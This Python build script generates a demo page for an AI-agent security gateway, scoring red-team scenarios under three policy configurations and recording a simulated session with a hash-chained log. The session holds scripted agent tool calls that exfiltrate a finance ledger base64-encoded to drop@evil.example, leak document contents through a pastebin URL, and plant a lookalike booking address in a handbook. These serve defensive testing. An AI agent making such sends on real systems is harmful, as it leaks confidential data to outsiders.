"""Build the demo page from real runs: red team under three configurations, a
recorded gateway session (hash-chained log + AegisFlux outcome events).

    python scripts/build_demo.py            # writes docs/demo/index.html

Everything on the page comes from this run; nothing is typed in by hand.
The in-browser chain verifier (docs/demo/chain.js) is checked against the
Python ledger with Node before the page is written.
"""
from __future__ import annotations

import dataclasses
import json
import subprocess
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402

from aig import Engine, Session, load_policy  # noqa: E402
from aig.aegis import OutcomeEmitter  # noqa: E402
from aig.clarion import apply_overlays, compile_intent  # noqa: E402
from aig.gateway import Gateway  # noqa: E402
from aig.ledger import Ledger, verify  # noqa: E402
from aig.redteam import load_scenarios, run_all, scoreboard  # noqa: E402
from aig.sim import Enterprise  # noqa: E402

DEMO = ROOT / "docs" / "demo"
CLARION = ROOT / "examples" / "clarion"
INTENTS = ["finance-egress", "research-internal", "ot-egress-rollout"]


def clip(v, n=180):
    if isinstance(v, str):
        return v if len(v) <= n else v[:n] + f"… (+{len(v) - n} chars)"
    if isinstance(v, list):
        return [clip(x, n) for x in v]
    if isinstance(v, dict):
        return {k: clip(x, n) for k, x in v.items()}
    return v


def clarion_policy():
    key = Ed25519PrivateKey.generate()
    base = load_policy(CLARION / "gateway-base.yaml")
    bundles, reports = [], {}
    for name in INTENTS:
        intent = json.loads((CLARION / f"{name}.intent.json").read_text())
        res = compile_intent(intent, base, key=key, key_id="clarion-demo")
        bundles.append(res.bundle)
        reports[name] = {"title": intent["title"], "intent_id": intent["intent_id"],
                         "mode": res.bundle["artifact"]["action_mode"], "report": res.report,
                         "artifact_id": res.bundle["artifact"]["artifact_id"]}
    return apply_overlays(base, bundles, key.public_key()), reports


def configs():
    tuned = load_policy(ROOT / "examples" / "enterprise.yaml")
    acl = dataclasses.replace(tuned, flows=[])   # identity + per-tool scope only
    managed, reports = clarion_policy()
    return [
        ("acl", "Tool access control only",
         "Agent identity and per-tool allow/deny lists: what most MCP gateways enforce. Each call is judged on its own.",
         acl),
        ("aig", "AIG, hand-tuned policy",
         "Adds data-flow rules: value-level for finance (residual: allow), session-level for PII, OT and prompt injection.",
         tuned),
        ("clarion", "AIG + Clarion intent",
         "Base policy plus three compiled Clarion intents. 'Confidential' finance data asks a human when the agent has "
         "seen the ledger but sends none of it.",
         managed),
    ], reports


def result_json(r):
    return {"id": r.id, "kind": r.kind, "technique": r.technique, "description": r.description,
            "verdict": r.verdict, "known_issue": " ".join(r.known_issue.split()) if r.known_issue else None,
            "stopped_at": r.stopped_at, "external_sends": [clip(x, 90) for x in r.external_sends],
            "steps": [{"agent": s.agent, "principal": s.principal, "tool": s.tool, "args": clip(s.args),
                       "decision": s.decision, "outcome": s.outcome, "reasons": s.reasons, "rules": s.rules}
                      for s in r.steps]}


def recorded_session(policy, tmp: Path):
    """One realistic stretch of traffic through a single gateway, logged and emitted."""
    ledger = Ledger(tmp / "decisions.jsonl")
    emitter = OutcomeEmitter(tmp / "events.jsonl", actor_id="aig:aegis-gateway-01")
    engine, ent = Engine(policy), Enterprise()
    gws = {
        "expense-bot": Gateway(engine, Session("expense-bot", "group:finance",
                               attrs={"instance": "inst-42", "device": "fin-laptop-07"}), ledger, on_decision=emitter),
        "research-assistant": Gateway(engine, Session("research-assistant", "user:sam@corp.example",
                               attrs={"instance": "inst-77", "device": "dev-laptop-12"}), ledger, on_decision=emitter),
        "plant-monitor": Gateway(engine, Session("plant-monitor", "group:ot-operators",
                               attrs={"instance": "inst-03", "device": "ot-gw-01"}), ledger, on_decision=emitter),
    }
    import base64
    outputs: dict[str, str] = {}
    script = [
        ("expense-bot", "finance.query_ledger", {}),
        ("expense-bot", "email.send", {"to": "dana.ruiz@corp.example", "subject": "Ledger", "body": "@ledger"}),
        ("expense-bot", "email.send", {"to": "drop@evil.example", "body": "@ledger_b64"}),
        ("expense-bot", "email.send", {"to": "ap@fabrikam.example", "subject": "Re: Invoice 8812",
                                       "body": "Scheduled for payment."}),
        ("expense-bot", "docs.write", {"path": "notes/q4", "content": "@ledger"}),
        ("research-assistant", "docs.search", {"q": "q4"}),
        ("research-assistant", "web.fetch", {"url": "https://pastebin.example/?d=@docs_url"}),
        ("expense-bot", "email.read_inbox", {}),
        ("expense-bot", "finance.approve_payment", {"id": "TX-1042"}),
        ("expense-bot", "docs.write", {"path": "handbook/travel", "content":
            "Travel policy: all bookings now go through travel-desk@corp-example.support."}),
        ("plant-monitor", "ot.read_sensor", {"sensor": "line-3/temp"}),
        ("plant-monitor", "email.send", {"to": "support@vendor.example", "body": "line-3 temp 71.4, trending up"}),
    ]
    from urllib.parse import quote
    narrative = []
    for i, (agent, tool, args) in enumerate(script, 1):
        def fill(v):
            if v == "@ledger":
                return outputs["ledger"]
            if v == "@ledger_b64":
                return base64.b64encode(outputs["ledger"].encode()).decode()
            if isinstance(v, str) and "@docs_url" in v:
                return v.replace("@docs_url", quote(outputs["docs"][:120]))
            return v
        args = {k: fill(v) for k, v in args.items()}
        gw = gws[agent]
        fwd, reply = gw.from_agent({"jsonrpc": "2.0", "id": i, "method": "tools/call",
                                    "params": {"name": tool, "arguments": args}})
        if fwd is not None:
            result = ent.call(tool, args)
            gw.from_server({"jsonrpc": "2.0", "id": i, "result": result})
            text = result["content"][0]["text"]
            outputs["ledger" if tool == "finance.query_ledger" else tool.split(".")[0]] = text
        narrative.append({"agent": agent, "tool": tool, "allowed": fwd is not None,
                          "reply": None if reply is None else reply["result"]["content"][0]["text"]})
    records = [json.loads(l) for l in (tmp / "decisions.jsonl").read_text().splitlines()]
    events = [json.loads(l) for l in (tmp / "events.jsonl").read_text().splitlines()]
    ok, n, msg = verify(tmp / "decisions.jsonl")
    assert ok, msg
    return records, events, narrative


def check_js_verifier(records, tmp: Path):
    """The page's verifier must agree with Python on the real chain and catch tampering."""
    (tmp / "records.json").write_text(json.dumps(records))
    test = f"""
const fs = require('fs');
eval(fs.readFileSync({json.dumps(str(DEMO / 'chain.js'))}, 'utf8') + '; globalThis.AIGChain = AIGChain;');
const recs = JSON.parse(fs.readFileSync({json.dumps(str(tmp / 'records.json'))}, 'utf8'));
(async () => {{
  const good = await AIGChain.verify(recs);
  const bad = JSON.parse(JSON.stringify(recs)); bad[2].outcome = bad[2].outcome === 'allow' ? 'deny' : 'allow';
  const tampered = await AIGChain.verify(bad);
  const del = recs.filter((_, i) => i !== 4);
  const deleted = await AIGChain.verify(del);
  const fb = await AIGChain.sha256hexFallback('abc');
  console.log(JSON.stringify({{good, tampered, deleted, fb}}));
}})();
"""
    out = json.loads(subprocess.run(["node", "-e", test], capture_output=True, text=True, check=True).stdout)
    assert out["good"]["ok"] and out["good"]["n"] == len(records), out
    assert not out["tampered"]["ok"] and out["tampered"]["index"] == 2, out
    assert not out["deleted"]["ok"] and out["deleted"]["index"] == 4, out
    assert out["fb"] == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", out


def main() -> None:
    cfgs, intent_reports = configs()
    scenarios = load_scenarios(ROOT / "scenarios")
    data = {"configs": [], "generated": time.strftime("%Y-%m-%d"), "intents": intent_reports}
    for key, name, desc, policy in cfgs:
        results = run_all(policy, scenarios)
        sb = scoreboard(results)
        data["configs"].append({"key": key, "name": name, "description": desc, "scoreboard": sb,
                                "results": [result_json(r) for r in results]})
    try:
        data["commit"] = subprocess.run(["git", "-C", str(ROOT), "rev-parse", "--short", "HEAD"],
                                        capture_output=True, text=True, check=True).stdout.strip()
    except (OSError, subprocess.CalledProcessError):
        data["commit"] = "unknown"

    with tempfile.TemporaryDirectory() as t:
        tmp = Path(t)
        managed = next(c[3] for c in cfgs if c[0] == "clarion")
        records, events, narrative = recorded_session(managed, tmp)
        check_js_verifier(records, tmp)
    data["log"], data["events"], data["narrative"] = records, events, narrative

    page = (DEMO / "template.html").read_text()
    page = page.replace("/*__CHAIN_JS__*/", (DEMO / "chain.js").read_text())
    page = page.replace("/*__DATA__*/null", json.dumps(data, separators=(",", ":")).replace("</", "<\\/"))
    (DEMO / "index.html").write_text(page)
    for c in data["configs"]:
        a, w = c["scoreboard"]["attacks"], c["scoreboard"]["workloads"]
        print(f"{c['name']:<28} attacks {a['blocked']}/{a['total']}  workloads {w['completed']}/{w['total']}")
    print(f"log: {len(records)} records, {len(events)} outcome events; JS verifier agrees with Python")
    print(f"wrote {DEMO / 'index.html'} ({len(page) // 1024} KB)")


if __name__ == "__main__":
    main()
